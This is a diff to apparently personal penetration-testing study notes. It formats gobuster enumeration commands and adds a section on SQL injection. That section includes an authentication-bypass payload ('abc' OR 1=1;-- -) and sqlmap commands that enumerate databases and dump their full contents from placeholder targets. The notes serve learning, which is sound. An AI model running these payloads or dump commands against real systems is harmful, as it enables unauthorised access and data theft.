@@ -355,7 +355,19 @@
 - Hydra John the Ripper and Hashcat are industry-standard tools. Hydra is for online brute-forcing testing live login pages/services) while John
   the Ripper and Hashcat are for offline cracking recovering plaintext from stolen or extracted password hashes
 - gobuster is used for directory enumeration and for subdomain enumeration for enumerating directories we use the following command
+  ```
   gobuster dir -u "http://www.example.thm/" -w /usr/share/wordlists/dirb/small.txt -t 64
   gobuster dir -u "http://www.example.thm" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r
   and for enemurating sub directoories we use the following command
   gobuster dns -d example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+  ```
+- for sql injection we have manual method in which we add a username and then type a random password and add some random characters to it as well
+  which results in autentication like in password area we can type :  'abc' OR 1=1;-- -';  the OR operator will do a trick which is
+  that abc will give the password wrong but 1=1 is always true and will give true which will lead to attack but this process is slow and for
+  fast attacks we use a tool called sqlmap   the ultimate sqlmap command
+  ```
+  sqlmap -u "http://target.com" --batch --level=5 --risk=2 --random-agent --dbs  // thsi will find the databse names
+  sqlmap -u "http://target.com" --batch -D databsename --tables  // this will give all the tables in te found database 
+  sqlmap -u "http://target.com" --random-agent --forms --level=5 --risk=3 --dump --batch  // this is the aggressive prompt that will dumo everything 
+  ```
+  
